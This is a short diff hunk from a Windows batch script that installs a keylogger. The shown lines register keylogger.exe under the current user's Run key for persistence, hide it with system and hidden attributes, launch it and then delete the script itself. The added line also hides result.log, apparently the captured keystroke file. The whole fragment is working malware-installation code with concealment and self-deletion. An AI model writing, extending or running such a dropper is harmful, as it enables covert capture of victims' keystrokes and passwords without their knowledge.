@@ -36,4 +36,5 @@
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %userprofile%\Desktop\keylogger.exe /f > nul
 attrib +s +h +r %userprofile%\Desktop\keylogger.exe
 start %userprofile%\Desktop\keylogger.exe
+attrib +s +h %userprofile%\result.log
 del %0
